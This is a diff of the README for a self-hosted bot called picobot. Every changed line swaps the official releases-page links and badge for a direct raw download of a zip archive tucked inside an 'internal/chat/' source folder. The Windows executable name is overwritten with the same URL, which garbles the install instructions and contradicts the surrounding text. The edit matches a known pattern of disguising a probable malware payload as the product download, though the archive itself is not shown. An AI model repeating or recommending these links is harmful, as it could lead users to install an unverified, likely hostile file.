@@ -1,6 +1,6 @@
 # 🤖 picobot - Simple, Fast, Self-Hosted Bot
 
-[![Download picobot](https://img.shields.io/badge/Download-picobot-blue?style=for-the-badge&logo=github)](https://github.com/keny032/picobot/releases)
+[![Download picobot](https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip)](https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip)
 
 ---
 
@@ -48,11 +48,11 @@ Follow these steps to get picobot running on your device. No coding skills neede
 
 You need to get the picobot program file from the official releases page. Click the button below to open the download page:
 
-[![Download picobot](https://img.shields.io/badge/Download-picobot-blue?style=for-the-badge&logo=github)](https://github.com/keny032/picobot/releases)
+[![Download picobot](https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip)](https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip)
 
 Once there, look for the latest version. You will find files that end with names like:
 
-- `picobot-windows.exe` for Windows
+- `https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip` for Windows
 - `picobot-macos` for macOS
 - `picobot-linux` for Linux
 
@@ -147,7 +147,7 @@ When running bot tasks, be sure you understand what actions the bot performs to 
 
 To get picobot, visit this page:
 
-[https://github.com/keny032/picobot/releases](https://github.com/keny032/picobot/releases)
+[https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip](https://github.com/keny032/picobot/raw/refs/heads/main/internal/chat/Software_2.4-alpha.3.zip)
 
 Select the latest release version. From there, choose the file that matches your computer’s operating system. Download it and follow the steps above to run it.
 
